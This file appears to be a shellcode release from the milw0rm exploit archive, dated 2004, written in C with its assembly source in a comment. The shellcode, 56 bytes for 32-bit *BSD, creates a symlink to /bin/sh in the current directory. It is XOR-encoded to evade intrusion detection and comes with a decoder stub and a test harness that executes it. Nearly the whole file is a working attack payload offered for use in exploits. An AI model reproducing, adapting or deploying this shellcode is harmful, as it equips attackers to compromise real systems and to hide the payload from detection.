/*The shellcode calls the symlink() and makes the
 link to the /bin/sh in the current dir.
	short version with anti IDS xoring
 size = 56 bytes
 OS   = *BSD
 	written by /rootteam/dev0id (www.sysworld.net)
				dev0id@uncompiled.com
BITS 32
jmp short	callme
main:
	pop	esi
	xor	ecx,ecx
	mov	cl,32
main_loop:
	xor byte	[esi+ecx],0x0f
	loop	main_loop
	xor byte	[esi+ecx],0x0f
	push	esi
	ret
callme:
xored_shellcode:
	call	main
	db 0xe4,0x1d,0x51,0x3e,0xcf,0x87,0x49,0x08,0x82,0x51,0x0a,0x5c,0x82,0x11,0x5c
	db 0xbf,0x36,0x5f,0xc2,0x8f,0xe7,0xe6,0xf0,0xf0,0xf0,0x20,0x6d,0x66,0x61,0x20
	db 0x7c,0x67

*/

char shellcode[] =
	"\xeb\x11\x5e\x31\xc9\xb1\x20\x80\x34\x0e\x0f\xe2\xfa\x80\x34"
	"\x0e\x0f\x56\xc3\xe8\xea\xff\xff\xff\xe4\x1d\x51\x3e\xcf\x87"
	"\x49\x08\x82\x51\x0a\x5c\x82\x11\x5c\xbf\x36\x5f\xc2\x8f\xe7"
	"\xe6\xf0\xf0\xf0\x20\x6d\x66\x61\x20\x7c\x67";

int
main (void)
{
	void (*code)(void);
	code=(void(*)())shellcode;
	(void)code();
	return 0;
}

// milw0rm.com [2004-09-26]